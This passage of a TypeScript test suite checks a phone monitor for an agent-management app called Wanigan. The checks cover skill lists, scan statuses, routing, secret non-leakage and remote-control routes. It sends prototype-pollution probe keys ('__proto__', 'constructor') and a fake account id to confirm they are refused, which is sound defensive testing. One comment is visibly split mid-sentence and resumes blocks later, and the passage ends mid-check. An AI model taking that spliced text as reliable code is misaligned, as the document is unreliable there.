    'a skill file whose invocation form Wanigan has not verified is dropped from the list and counted where it was dropped, and ../skills’ own caveat about the built-in family is carried verbatim only while a built-in row is actually on screen — a catalogue quietly missing rows is a short list, and a short list is a lie',
    `${skillOmitted.total} listed, ${skillOmitted.agentSkillCount} Codex files omitted, built-in note ${skillBuiltin.builtinNote === null ? 'absent' : 'present'} with a built-in row`);

    const skillMany = Array.from({ length: skillsWire.MOBILE_SKILL_LIMITS.skills + 12 }, (_, index) => ({
      invoke: `/s${index}`, name: `s${index}`, label: `S${index}`, description: 'One of many.',
      source: 'user', harness: 'claude-code', invocable: { user: true as boolean | 'unknown' },
    }));
    const skillCapped = skillsWire.mobileSkillList(skillMany, '');
    const skillSearched = skillsWire.mobileSkillList(skillRows, 'RED, GREEN');
    check(skillCapped.skills.length === skillsWire.MOBILE_SKILL_LIMITS.skills
      && skillCapped.truncated && skillCapped.matchCount === skillMany.length
      && skillSearched.skills.length === 1 && skillSearched.skills[0].invoke === '/tdd'
      && skillSearched.matchCount === 1 && skillSearched.total === 3 && !skillSearched.truncated,
    'the search runs in the main process over the command, both of its names and its description, and the answer says how many matched before the cap cut it — thirty rows out of forty-two with nothing said about the other twelve is a silently short list',
    `capped ${skillCapped.skills.length} of ${skillCapped.matchCount}; the search matched ${skillSearched.matchCount} of ${skillSearched.total}`);

    // The negative. Typing a command into a prompt and sending a turn are two
    // different acts, and only the first one happens here.
    check(skillsWire.MOBILE_SKILL_LIMITS.typedSuffix === ' '
      && !skillsSrc.includes('\\r') && !skillsSection.script.includes('\\r')
      && skillsSrc.includes('submitted: false')
      && skillsSection.script.includes('Nothing was sent')
      && !/\bran the skill\b|\bskill ran\b|successfully/i.test(skillsSection.script),
    'firing a skill types the command into the agent’s prompt and stops there: no carriage return is ever written, the answer carries submitted:false, and nothing the screen can print afterwards claims the skill ran — the PTY owns keystrokes and Wanigan has not parsed what the agent will do with them',
    `suffix ${JSON.stringify(skillsWire.MOBILE_SKILL_LIMITS.typedSuffix)}`);

    const skillCalls = skillsSection.script.match(/api\('api\/[^']*'/g) ?? [];
    const skillBody = /body:JSON\.stringify\(\{([^}]*)\}\)/.exec(skillsSection.script)?.[1] ?? '';
    check(sectionAnchors.includes('agent-skills') && composedShell.split('id="agent-skills"').length === 2
      && composedShell.includes('id="skill-q"') && composedShell.includes('id="skill-list"')
      && skillsSection.slot === 'controls' && skillCalls.length === 2
      && skillBody.includes('skillId:row.id') && !skillBody.includes('invoke'),
    'the skill card is composed exactly once into the Agent screen’s remote-control block and posts an id and a session — never the text to write, because the Mac decides what an id means and a route that accepted the text would be an unrestricted terminal write wearing a skill’s name',
    `${composedShell.split('id="agent-skills"').length - 1} cards, calls: ${skillCalls.join(' | ') || 'none'}, body: ${skillBody.trim() || 'none'}`);

    check(skillsSection.script.includes("ui.off('Sending a skill is off.'")
      && skillsSection.script.includes('Wanigan Settings → Phone monitor')
      && skillsSection.script.includes('skillsPayload.blocked')
      && skillsSection.style.includes('.skill-row-flat')
      && skillsSection.wiring.includes("ui.watch('agent', loadSkills)")
      && !/setInterval/.test(skillsSection.script + skillsSection.wiring),
    'the skill card draws its absences through the shared ui helpers rather than as a list of dead buttons — off names the exact setting, and a session Wanigan will not type into flattens the rows to readable names — and it registers its read with the frame instead of holding an interval of its own',
    `${skillsSection.wiring.includes("ui.watch('agent', loadSkills)") ? 'ui.watch' : 'no watch'}, ${/setInterval/.test(skillsSection.script + skillsSection.wiring) ? 'holds an interval' : 'no interval'}`);

    const skillAbsent = MOBILE_ABSENT.find((entry) => entry.tab === 'skills');
    check(!!skillAbsent && /stays on the Mac/.test(skillAbsent.reason) && /Agent screen/.test(skillAbsent.reason)
      && !MOBILE_VIEWS.some((view) => String(view.id) === 'skills')
      && composedShell.includes(skillAbsent!.reason),
    'the Skills SCREEN is still deliberately absent and the Device screen still prints why, but its reason now separates the two halves it used to fold together: editing a skill is work against a repository this device does not have, and typing one that already exists is on the Agent screen',
    skillAbsent?.reason ?? 'no absent entry for skills');
    /* ── the Scout digest · three outcomes that are not one outcome ──────
     * A scan reports 'running', 'completed', 'blocked' or 'failed'. 'blocked'
     * means a consent gate stopped the pass before it contacted anything, so
     * drawing it as a completed scan is the app announcing an online check at
     * the moment the code declined to make one — the bug the desktop view
     * carried until it finally read its own run record. The phone is built
     * from the fixed version, and these hold it there: at the wire, where the
     * status and the stored reason both travel, and in the screen's own
     * script, where the three outcomes get three different sentences. */
    const scoutWire = await import('./mobile/scout');
    const scoutSection = (await import('./mobile/page/sections/scout')).SCOUT_SECTION;
    const scoutAt = Date.now();
    const scoutRunBase = {
      id: 'scout_run_smoke', mode: 'scheduled', status: 'completed', networkAllowed: true,
      sourceCount: 3, evidenceCount: 3, suggestionCount: 2, analysisMethod: 'deterministic-rules',
      startedAt: scoutAt - 600_000, endedAt: scoutAt, detail: null, error: null,
    } as const;
    const scoutBlocked = scoutWire.mobileScoutRun({
      ...scoutRunBase, status: 'blocked', networkAllowed: false,
      sourceCount: 0, evidenceCount: 0, suggestionCount: 0,
      detail: 'Weekly research was paused before this queued pass began. No official source was contacted.',
    });
    const scoutFailedRun = scoutWire.mobileScoutRun({
      ...scoutRunBase, status: 'failed', evidenceCount: 0, suggestionCount: 0,
      detail: 'No official source could be read. Nothing was proposed.',
      error: 'Official sources returned no readable content.',
    });
    const scoutLocalPass = scoutWire.mobileScoutRun({
      ...scoutRunBase, mode: 'preview', networkAllowed: false, evidenceCount: 0, suggestionCount: 0,
    });
    check(scoutBlocked.status === 'blocked' && scoutBlocked.detail !== null && scoutBlocked.error === null
      && scoutFailedRun.status === 'failed' && scoutFailedRun.error !== null
      && scoutLocalPass.status === 'completed' && scoutLocalPass.networkAllowed === false
      && scoutSection.script.includes("if (run.status === 'blocked') {")
      && scoutSection.script.includes("if (run.status !== 'completed') {")
      && scoutSection.script.includes('A consent gate stopped this scan before it contacted anything, so no online check was made.')
      && scoutSection.script.includes('A local pass: the capability inventory was refreshed and no official source was contacted.'),
    'a scan a consent gate blocked reaches the phone as blocked and carries the reason it was written with, a scan that broke keeps its error, and a completed pass that was never allowed online is drawn as the local refresh it was — none of the three can be read as an online check that happened',
    `${scoutBlocked.status}/${scoutFailedRun.status}/${scoutLocalPass.status}`);

    /* ── the deterministic analyser · a promise the phone may not drop ────
     * The desktop says in so many words that no source text is sent to a
     * model. A second surface that quietly stops saying it is worse than one
     * that never said it, so the claim travels with the analyser that earns
     * it — and only with that one. */
    const scoutOverviewBase = {
      enabled: true, weeklyEnabled: true, networkEnabled: true, cadenceLabel: 'Every Saturday at 9am',
      lastRunAt: scoutAt - 3_600_000, nextRunAt: scoutAt + 3_600_000, pendingSuggestions: 2,
      sourceCount: 3, enabledSourceCount: 3, analysisMethod: 'deterministic-rules', latestRun: null,
    } as const;
    const scoutDigest = scoutWire.mobileScoutPayload(
      { overview: { ...scoutOverviewBase }, sources: [], open: [] }, scoutAt, scoutAt);
    // Forced in, because the type holds exactly one analyser today. That is
    // the case worth proving: a method this build has never seen must not
    // inherit the sentence written for the one it has.
    const scoutFutureDigest = scoutWire.mobileScoutPayload({
      overview: {
        ...scoutOverviewBase,
        analysisMethod: 'model-assisted' as unknown as (typeof scoutOverviewBase)['analysisMethod'],
      },
      sources: [], open: [],
    }, scoutAt, scoutAt);
    check(scoutDigest.analysisMethod === 'deterministic-rules' && scoutDigest.deterministic
      && scoutFutureDigest.analysisMethod === 'model-assisted' && !scoutFutureDigest.deterministic
      && scoutSection.script.includes('if (scoutPayload.deterministic) {')
      && scoutSection.script.includes('Proposals are built by local deterministic rules. No source text is sent to a model.')
      && scoutSection.script.includes('which this screen cannot describe'),
    'the promise that no source text is sent to a model reaches the phone with the analyser that earns it, and an analyser this build has never seen is named and left undescribed rather than inheriting the promise',
    `${scoutDigest.analysisMethod} → ${scoutDigest.deterministic}, ${scoutFutureDigest.analysisMethod} → ${scoutFutureDigest.deterministic}`);

    /* ── evidence · bounded, and the cut is announced ─────────────────────
     * The Scout stores up to 900 characters per evidence row. Twenty
     * proposals with three sources each would put tens of kilobytes of source
     * prose on a cellular radio, so the passage is cut — and an excerpt that
     * stops mid-sentence with nothing said about it is indistinguishable from
     * a source that trailed off there. */
    const scoutEvidenceBase = {
      id: 'scout_ev_smoke', runId: 'scout_run_smoke', suggestionId: 'scout_idea_smoke',
      sourceId: 'claude-code-changelog', title: 'Claude Code changelog',
      url: 'https://code.claude.com/docs/en/changelog', publisher: 'Anthropic',
      excerpt: '', contentHash: 'smoke', publishedAt: null, retrievedAt: scoutAt,
    } as const;
    const scoutProposal = scoutWire.mobileScoutProposal({
      id: 'scout_idea_smoke', status: 'new', category: 'Capability', title: 'Smoke proposal',
      summary: 'A proposal the offline suite built.', whyNow: 'The suite built it.',
      recommendation: 'Scope it before doing it.', score: 71, confidence: 0.6,
      effort: 'small', risk: 'low', analysisMethod: 'deterministic-rules',
      createdAt: scoutAt, updatedAt: scoutAt, reviewedAt: null, note: null, goalId: null,
      evidence: [
        { ...scoutEvidenceBase, excerpt: 'x'.repeat(4_000) },
        { ...scoutEvidenceBase, id: 'scout_ev_2', excerpt: 'A short passage that was never cut.' },
        { ...scoutEvidenceBase, id: 'scout_ev_3', excerpt: 'A third passage.' },
        { ...scoutEvidenceBase, id: 'scout_ev_4', excerpt: 'A fourth passage.' },
      ],
    });
    check(scoutProposal.evidence.length === scoutWire.MOBILE_SCOUT_LIMITS.evidencePerProposal
      && scoutProposal.evidenceCount === 4 && scoutProposal.evidenceTruncated
      && scoutProposal.evidence[0].excerpt.length === scoutWire.MOBILE_SCOUT_LIMITS.excerptChars
      && scoutProposal.evidence[0].excerptTruncated
      && !scoutProposal.evidence[1].excerptTruncated
      && !('score' in scoutProposal)
      && scoutSection.script.includes('This passage was cut at ')
      && scoutSection.script.includes('attached sources. The rest are on the Mac.'),
    'an oversized source excerpt is cut to the phone bound and the row says it was cut rather than trailing off silently, a proposal with more sources than fit says how many are missing, and the rule-table score never crosses the wire at all',
    `${scoutProposal.evidence[0].excerpt.length} chars, ${scoutProposal.evidence.length} of ${scoutProposal.evidenceCount} sources`);
    // The generic anchor sweep above passes vacuously for a screen that was
    // never registered, so the Goals screen is named here too — with the two
    // sentences it exists to say. Both meanings of 'blocked' and the absence a
    // goal with no base commit reports are in the served bytes, so a refactor
    // that drops them fails here rather than on someone's phone.
    check(sectionAnchors.includes('goals') && composedShell.split('id="goals"').length === 2
      && composedShell.includes('no base commit recorded')
      && composedShell.includes('Held by a prerequisite that failed or was canceled.')
      && composedShell.includes('Waiting on a prerequisite that has not finished.'),
    'the Goals screen is composed exactly once and carries both meanings of blocked, plus the sentence a goal with no base commit gets instead of a cause nothing observed',
    `${composedShell.split('id="goals"').length - 1} goals screens`);
    // Every phone destination is a real panel on the served page, exactly one
    // of them, whether or not it is built yet: the eight unbuilt ones render a
    // sentence naming what will be there. A view in MOBILE_VIEWS with no panel
    // is a live tab that navigates to a blank screen, which is the same lie as
    // an empty fleet on a sleeping Mac — it looks like an answer and it is the
    // absence of one.
    const missingViews = MOBILE_VIEWS.filter((view) => composedShell.split(`id="view-${view.id}"`).length !== 2);
    // Goals, Learning and Scout have real screens now, so the placeholder text
    // this used to pin is correctly gone. What is still worth pinning is the
    // rule rather than any one screen's sentence: whatever remains unbuilt must
    // name itself and say what will be there. Batches is the last one, and it
    // is deliberately last — composing a fan-out is a Mac job.
    const placeholderViews = MOBILE_VIEWS
      .filter((view) => composedShell.includes(`${mobileViewLabel(view.id)} is not built for the phone yet.`));
    check(MOBILE_VIEWS.length === 10 && missingViews.length === 0
      && placeholderViews.every((view) => composedShell.includes(`id="view-${view.id}"`))
      && !composedShell.includes('is not built for the phone yet.</p></section>'),
    'the served page carries one panel per phone destination, and any destination with no screen yet names itself and says what will be there rather than rendering blank',
    `${missingViews.map((view) => view.id).join(', ') || 'no missing panels'}; placeholders: ${placeholderViews.map((v) => v.id).join(', ') || 'none'}`);
    // NOTE for the integrator: this needs TAB_SHORTCUTS added to the existing
    // routes import at the top of this file —
    //   import { SIDEBAR_GROUPS, TABS, TAB_ICONS, TAB_SHORTCUTS } from '../shared/routes';
    // MOBILE_VIEWS is already imported.
    //
    // An iPad keyboard reaches all four thumb-bar destinations directly, and
    // the chord printed on the button is the chord that fires: one string,
    // used as aria-keyshortcuts and as the handler's test. The digits are the
    // desktop's, taken from the Control alternative shared/routes.ts already
    // publishes beside each ⌘ one — ⌘1–9 is Safari's tab switcher on an iPad
    // and never reaches a page — so ⌃2 is Fleet on the phone because ⌘2 is
    // Fleet on the Mac. A renumbered desktop digit row has to move the phone    // A reload has to land on the screen you were on, and it must not do that
    // through the address. The fragment is where the pairing token arrives and
    // tokenFromFragment() deletes it on the first tick, so routing through the
    // hash would mean this page writing to that same field on every tap. The
    // route lives in localStorage and history.state instead: every history
    // write on the page is either that one strip or the unchanged href, and
    // bootRoute() seeds its state after the strip rather than before it, so the
    // first Back out of a pushed route cannot restore the pairing link.
    const composedJs = composedShell.slice(composedShell.indexOf('<script nonce='), composedShell.indexOf('</script>'));
    // The generic anchor sweep above passes vacuously for a screen that was
    // never registered, so the Learning screen is named here — with the two
    // sentences that keep it honest. Model-assisted consolidation is not
    // connected in this build, and a review queue that let someone infer a model
    // had already looked would be claiming a capability Wanigan does not have.
    // The second is what an approval reports: this route records the review and
    // stops, so a page implying the knowledge had been written would leave
    // someone believing a job was finished that nobody has started.
    check(sectionAnchors.includes('learning')
      && composedShell.split('id="learning"').length === 2
      && composedJs.includes('No model read them.')
      && composedJs.includes('Wanigan records the approval and stops there')
      && composedJs.includes('Nothing has been written into knowledge or into a file')
      && !/model (?:reviewed|checked|approved|agreed)/i.test(composedJs)
      && composedJs.includes('learnRefresh = ui.watch(LEARNING_VIEW, learnLoad);'),
    'the review inbox is composed exactly once, says in words that no model read these proposals, reports an approval as the decision it is rather than as knowledge already written, and follows the frame’s shared poll instead of holding a radio-waking timer of its own',
    `${composedShell.split('id="learning"').length - 1} learning screens`);
    // with it rather than leaving one number meaning two screens.
    const barChords = MOBILE_VIEWS.filter((view) => view.bar).map((view) => ({
      id: view.id,
      chord: TAB_SHORTCUTS[view.narrows[0]].aria.split(/\s+/).find((alt) => alt.startsWith('Control+')) ?? '',
    }));
    const unreachable = barChords.filter((entry) => !entry.chord
      || composedShell.split(`data-goto="${entry.id}" aria-keyshortcuts="${entry.chord}"`).length !== 3
      || !composedJs.includes(`{"view":"${entry.id}","chord":"${entry.chord}","key":"${entry.chord.slice(-1).toLowerCase()}","shift":false}`));
    check(barChords.length === 4 && unreachable.length === 0
      && composedJs.includes("if (!event.ctrlKey || event.metaKey || event.altKey || event.repeat) return '';")
      && composedJs.includes('const hit = NAV_CHORDS.find((entry) => entry.key === key && entry.shift === event.shiftKey);'),
    'every thumb-bar destination is one keystroke away on an iPad keyboard, published on both the bar and the rail as the same chord the key handler matches, and taken from the desktop route that screen narrows',
    unreachable.map((entry) => `${entry.id}:${entry.chord || 'none'}`).join(', ') || 'none');
    const historyWrites = composedJs.match(/history\.(?:push|replace)State\([^;]*?\);/g) ?? [];
    check(historyWrites.length === 3
      && historyWrites.every((call) => call.endsWith('location.href);') || call.endsWith('location.pathname + location.search);'))
      && !/location\.hash\s*=/.test(composedJs)
      && composedJs.includes("const VIEW_KEY = 'wanigan.mobile.view';")
      && composedJs.includes('localStorage.setItem(VIEW_KEY, id);')
      && composedJs.includes('localStorage.getItem(VIEW_KEY);')
      && composedJs.indexOf('bootRoute();') > composedJs.indexOf("history.replaceState(null, '', location.pathname + location.search);"),
    'a reload restores the phone route from localStorage and history.state, and no navigation writes the route — or the pairing token it would sit beside — into the URL',
    historyWrites.join(' | '));
    // Unpairing is local, and the copy says so. The token stays valid on the
    // Mac — revoking it for every device is a rotation in Settings — so a screen
    // that implied otherwise would leave someone who lost their phone believing
    // they had cut it off.
    const unpairAt = composedJs.indexOf("byId('device-unpair').addEventListener");
    const unpairEnd = composedJs.indexOf('paintDevice();', unpairAt + 1);
    const unpairBody = unpairAt >= 0 && unpairEnd > unpairAt ? composedJs.slice(unpairAt, unpairEnd) : '';
    check(composedShell.includes('It does not revoke that token on the Mac.')
      && composedShell.includes('rotate the pairing link in Wanigan Settings → Phone monitor')
      && unpairBody.includes('localStorage.removeItem(KEY);')
      && !unpairBody.includes('api(') && !unpairBody.includes('fetch('),
    'unpairing says plainly that it does not revoke the token on the Mac, and the handler matches the words: it drops the token from this browser and issues no request of its own',
    unpairBody ? 'handler read' : 'handler not found');
    // The interval it shows is the one the page will actually wait. poll()
    // doubles pollDelay towards POLL_SLOW_MS on every failure, so a screen that
    // printed the nominal POLL_FAST_MS would tell an operator whose Mac is
    // asleep that Wanigan is checking twenty times a minute while it is in fact
    // checking once — on the one screen whose whole job is this connection.
    check(composedJs.includes("deviceWords('device-poll', devicePollWords(pollDelay));")
      && composedJs.includes('pollTimer = setTimeout(() => { pollTimer = null; void poll(); }, pollDelay);')
      && composedJs.includes('pollDelay = Math.min(POLL_SLOW_MS, pollDelay * 2);')
      && !/setInterval\([^;]*paintDevice/.test(composedJs),
    'the Device screen prints the poll interval the page will really wait — the backed-off one — and ages it on the shared cadence rather than on a second timer of its own',
    composedJs.includes('devicePollWords(pollDelay)') ? 'reads pollDelay' : 'does not read pollDelay');
    // ── the Device screen: what this phone is, and what it deliberately is not ──
    // Every desktop destination Wanigan chose not to bring to the phone is
    // printed here with its reason, under the name the route table gives it. A
    // phone that simply has no Settings screen is indistinguishable from an
    // unfinished build, and the operator has to infer which — so a fifth entry
    // added to MOBILE_ABSENT has to reach the screen, not just the record.
    const escHtml = (value: string) => value.replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    const unprintedAbsent = MOBILE_ABSENT.filter((entry) => {
      const label = TABS.find((tab) => tab.id === entry.tab)?.label ?? entry.tab;
      return !composedShell.includes(escHtml(entry.reason))
        || !composedShell.includes(`<strong>${escHtml(label)}</strong>`);
    });
    check(MOBILE_ABSENT.length > 0 && unprintedAbsent.length === 0
      && composedShell.split('id="device"').length === 2
      && composedShell.includes('These Wanigan screens have no phone version, on purpose.'),
    'the Device screen is composed exactly once and prints every deliberately-absent desktop destination with its name and its reason, so a phone with no Settings screen says why rather than leaving a hole',
    unprintedAbsent.map((entry) => entry.tab).join(', ') || 'none');
    // The boundary, stated once and in the only place it can be read from the
    // phone: a pairing token is proof a device may read this fleet, not consent
    // to spend or to widen what Wanigan may do. The switches that stay at the
    // Mac are named with it, because 'you cannot change this here' without
    // saying what 'this' is sends someone hunting through preferences on a
    // screen they are not holding.
    const deviceMacSwitches = ['Remote control', 'Phone alerts', 'Repository review', 'The pairing link']
      .filter((switchName) => !composedShell.includes(`<strong>${switchName}</strong>`));
    check(deviceMacSwitches.length === 0
      && composedShell.includes('That is proof a device may read this fleet')
      && composedShell.includes('the switches below are read here and changed only at the Mac'),
    'the phone says once and plainly what a pairing token is not — consent to spend, to trust a plugin, or to widen what Wanigan may do — and names every switch that stays at the Mac beside the screens that do',
    deviceMacSwitches.join(', ') || 'none');
    // An alert this phone will never receive is worse than no alert at all, so
    // the screen states the limit instead of implying it away: a web page can
    // raise something only while it is open, and installing it to the Home
    // Screen does not change that while Web Push is unbuilt. It also reports
    // which of the two this browser is, so an operator who has already installed
    // it is not left working out whether the sentence is about them.
    check(composedShell.includes('Installing it to the Home Screen adds nothing to it')
      && composedShell.includes('only through Web Push, which Wanigan has not built')
      && composedShell.includes('has never asked for notification permission and holds no push subscription')
      && composedJs.includes("window.matchMedia('(display-mode: standalone)').matches")
      && composedJs.includes("deviceWords('device-alert-mode', deviceDisplayWords());"),
    'the phone settings screen says outright that an installed web page still cannot notify this device, naming Web Push as the thing Wanigan has not built rather than leaving a background alert implied',
    'stated');
    // The two values that make the alert path work must never reach the phone:
    // the topic is the ntfy subscription credential — anyone holding it receives
    // every alert — and the server is network-identifying metadata the page has
    // no use for. /api/status is checked for both above; this is the served
    // page, which now discusses that path in prose and could leak one in a
    // sentence rather than in a field.
    const devicePathSecrets = mobile.mobileConfig();
    const deviceScreenAt = composedShell.indexOf('<section id="device"');
    const deviceScreenHtml = composedShell.slice(deviceScreenAt, composedShell.indexOf('</section>', deviceScreenAt));
    check(deviceScreenHtml.length > 1000
      && devicePathSecrets.pushTopic.length > 0
      && !composedShell.includes(devicePathSecrets.pushTopic)
      && (devicePathSecrets.pushServer.length === 0 || !composedShell.includes(devicePathSecrets.pushServer))
      && !/https?:\/\//.test(deviceScreenHtml),
    'the phone settings screen describes the alert path without carrying it: neither the ntfy topic nor the configured server appears anywhere in the served page, and the screen itself holds no URL of any kind',
    `${deviceScreenHtml.length} bytes, topic ${devicePathSecrets.pushTopic.length} chars`);
    // The Device screen's alert row answers 'will anything reach me once I put
    // this down', so it has to be decided from the state the Mac sent rather
    // than from the fact that the switch is on: a path that is enabled and has
    // been rejected for two days looks exactly like a healthy one until the last
    // attempt is what writes the sentence. Every field the wire carries about
    // that attempt is read here, the row is built only from what render()
    // stored, and the served markup ships no verdict of its own — the alert
    // facts leave the Mac saying 'Not read yet'.
    const deviceAlertJs = composedJs.slice(composedJs.indexOf('function deviceAlertAge'), composedJs.indexOf('function paintDevice'));
    const deviceAlertBlock = composedShell.slice(composedShell.indexOf('<h2>Alerts to this device</h2>'), composedShell.indexOf('<h2>What stays on the Mac</h2>'));
    const unreadAlertFields = ['state.enabled', 'state.ready', 'state.blocked', 'state.lastOutcome',
      'state.lastAt', 'state.lastReason', 'state.lastHttpStatus', 'state.retryable']
      .filter((field) => !deviceAlertJs.includes(field));
    check(deviceAlertJs.length > 500 && unreadAlertFields.length === 0
      && composedJs.includes('deviceAlerts = snapshot.alerts || null;')
      && composedShell.includes('<strong id="device-alert-last">Not read yet</strong>')
      && ['Through ntfy', 'Failing', 'Not working'].every((verdict) => !deviceAlertBlock.includes(verdict))
      // The attempt is stamped by the Mac and the reading by this device, so the
      // age is the sum of two same-clock differences rather than one subtraction
      // across both: a Mac running an hour fast would otherwise date an alert
      // that failed an hour ago as 'just now'.
      && composedJs.includes('return Math.max(0, deviceGeneratedAt - at) + Math.max(0, Date.now() - lastGoodAt);'),
    'the Device screen decides its alert verdict from the reading the Mac sent — every field of the alert state, including how the last publish ended and when — rather than shipping a verdict in the markup or stopping at the switch being on',
    unreadAlertFields.join(', ') || 'none');
    // One radio, one cadence. Ten screens each holding their own interval is a
    // battery bug on a phone: nine of them fetch for panels nobody is looking
    // at, and none of them knows about the backoff the shell already applies
    // while the Mac is asleep. So a screen registers its read and the frame
    // decides when — on the poll it already makes, and only for the screen
    // actually on show. The dashboard being hidden counts as no screen at all:
    // before pairing a read would collect nothing but 401s.
    const uiFragment = composedJs.slice(composedJs.indexOf('// ── the four states'), composedJs.indexOf('// ── the route'));
    check(uiFragment.length > 500 && !uiFragment.includes('setInterval')
      && composedJs.includes('viewWatchers.forEach((watcher) => { if (watcher.viewId === shown) void runWatcher(watcher); });')
      && composedJs.includes("if (dashboard.classList.contains('hidden')) return '';")
      && composedJs.includes('render = (snapshot) => { renderWithoutViews(snapshot); refreshVisibleView(); };')
      && composedJs.includes("attributeFilter: ['class'], subtree: true });")
      && composedJs.indexOf('const ui = {') < composedJs.indexOf('const VIEW_IDS'),
    'a phone screen reads only while it is the screen on show, on the poll the frame already makes rather than a timer of its own',
    uiFragment.length);
    // The failed state is the only one with an action in it. A read that
    // failed and drew an empty box leaves someone holding a phone whose only
    // way forward is a reload, which throws away every other screen's reading
    // too — so that state, and only that state, hands back the read itself as
    // a button.
    const retryButtons = composedJs.split("node('button', 'secondary state-retry', 'Try again')").length - 1;
    check(retryButtons === 1
      && composedJs.includes("again.addEventListener('click', () => { void retry(); });")
      && composedJs.indexOf("node('button', 'secondary state-retry', 'Try again')") > composedJs.indexOf("uiBox('failed'")
      && composedJs.indexOf("node('button', 'secondary state-retry', 'Try again')") < composedJs.indexOf('off(title, sentence)')
      && composedShell.includes('.state-retry { grid-column:2;'),
    'a phone view whose read failed offers that read again as a button, and no other state pretends to',
    retryButtons);
    // Four absences, four renderings. A screen that is still reading, one
    // whose read failed, one whose capability is switched off at the Mac and
    // one with genuinely nothing on it used to arrive as the same blank panel,
    // and blank reads as broken — the empty fleet on a sleeping Mac, wearing
    // eighteen other screens' names. They are told apart four ways at once so
    // the distinction survives sunlight, greyscale and a screen reader: a
    // different glyph, different words, a different shape, a different role.
    const stateGlyphs = [...(composedJs.match(/const UI_GLYPH = \{[^}]*\};/)?.[0] ?? '').matchAll(/'([^']*)'/g)].map((m) => m[1]);
    check(stateGlyphs.length === 4 && new Set(stateGlyphs).size === 4
      && composedJs.includes("const box = uiBox('reading', 'Reading ' + what + '…', '');")
      && composedJs.includes("box.setAttribute('aria-busy', 'true');")
      && composedJs.includes("const box = uiBox('failed', 'Could not read ' + what + '.', message || 'Wanigan did not say why.');")
      && composedJs.includes("box.setAttribute('role', 'alert');")
      && composedJs.includes("off(title, sentence) { return uiBox('off', title, sentence); },")
      && composedJs.includes("const box = uiBox('empty', claim, note);")
      && composedJs.includes("node('div', 'state state-' + kind)")
      && composedShell.includes('.state-failed { border-color:'),
    'the phone frame draws still-reading, a failed read, a switched-off capability and a genuine absence as four different things rather than four blank panels',
    stateGlyphs.join(' '));
    const controls = await fetch(controlUrl, { headers: { authorization: `Bearer ${token}` } });
    const launch = await fetch(new URL('api/action', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'launch', projectId: 'prj_mobile', providerId: 'codex', model: 'gpt-5.6-sol', effort: 'high', prompt: 'Run the check' }),
    });
    check(controls.ok && JSON.parse(await controls.text()).projects?.[0]?.id === 'prj_mobile'
      && launch.status === 201 && remoteActions[0] === 'launch:prj_mobile:codex:gpt-5.6-sol:high:Run the check',
    'a paired iPad receives model and effort choices and can start an explicitly requested session');
    // An account id is untrusted input on the same POST route as a launch, and
    // this is the one case where refusing beats recovering: a session that
    // signs in as the wrong login writes to the wrong history and spends the
    // wrong subscription, so the refusal has to happen before anything starts
    // rather than resolving quietly to the default.
    const launchWrongAccount = await fetch(new URL('api/action', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'launch', projectId: 'prj_mobile', providerId: 'codex', prompt: 'Run the check', accountId: 'acct_not_a_real_account' }),
    });
    const launchWrongAccountBody = await launchWrongAccount.json() as { error?: string };
    check(launchWrongAccount.status === 400 && /no longer exists/.test(launchWrongAccountBody.error ?? '')
      && remoteActions.length === 1,
    'a launch naming an account this Mac does not have is refused before anything starts, rather than quietly signing in as whatever the default resolves to',
    `${launchWrongAccount.status}:${launchWrongAccountBody.error} after ${remoteActions.length} action(s)`);
    const remotePrompt = await fetch(new URL('api/action', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'prompt', sessionId: 's_mobile', prompt: 'Continue' }),
    });
    const remoteInterrupt = await fetch(new URL('api/action', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'interrupt', sessionId: 's_mobile' }),
    });
    check(remotePrompt.ok && remoteInterrupt.ok && remoteActions.slice(1).join('|') === 'prompt:s_mobile:Continue|interrupt:s_mobile',
      'remote control allows instruction and interrupt while permission approval stays out of the action API');
    const terminal = await fetch(new URL('api/terminal?session=s_mobile', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const terminalBody = JSON.parse(await terminal.text()) as { text?: string };
    check(terminal.ok && terminalBody.text === 'safe output for s_mobile' && !terminalBody.text.includes('\x1b'),
      'a paired device receives readable terminal text with ANSI and terminal metadata removed');
    // A blocked agent is not always waiting for a sentence. A Claude Code
    // permission prompt is a numbered menu and a Codex approval is a keypress;
    // both want an arrow, an Escape or a bare Enter, and "some text plus a
    // newline" can produce none of the three. So the phone can press keys — and
    // because that is a live PTY write, it sends a name out of a closed list
    // and the main process, not the page, decides what bytes that name is.
    const advertised = JSON.parse(await (await fetch(controlUrl, { headers: { authorization: `Bearer ${token}` } })).text()) as { keys?: { name: string; glyph: string; label: string }[] };
    const advertisedKeys = advertised.keys ?? [];
    const pressedKeys: number[] = [];
    for (const name of ['down', 'enter', 'escape']) {
      const press = await fetch(new URL('api/action', monitor.localUrl), {
        method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
        body: JSON.stringify({ action: 'key', sessionId: 's_mobile', key: name }),
      });
      pressedKeys.push(press.status);
      await press.arrayBuffer();
    }
    // Wrong case, a leading space, a plausible name that is simply not on the
    // list, a non-string — and the two that would exist on any object literal.
    // A key table reached through Object.prototype answers `constructor` with a
    // function and `__proto__` with an object, and either one is the phone
    // choosing what reaches the PTY instead of the Mac.
    const refusedKeys: { status: number; error?: string }[] = [];
    for (const name of ['Down', ' down', 'ctrl-c', '__proto__', 'constructor', 27]) {
      const refused = await fetch(new URL('api/action', monitor.localUrl), {
        method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
        body: JSON.stringify({ action: 'key', sessionId: 's_mobile', key: name }),
      });
      refusedKeys.push({ status: refused.status, ...(JSON.parse(await refused.text()) as { error?: string }) });
    }
    const keyWrites = remoteActions.filter((entry) => entry.startsWith('key:'));
    check(advertisedKeys.length === 6
      && advertisedKeys.every((key) => key.name && key.glyph && key.label)
      && pressedKeys.every((status) => status === 200)
      && refusedKeys.every((refused) => refused.status === 400 && Boolean(refused.error))
      && keyWrites.join('|') === 'key:s_mobile:"\\u001b[B"|key:s_mobile:"\\r"|key:s_mobile:"\\u001b"',
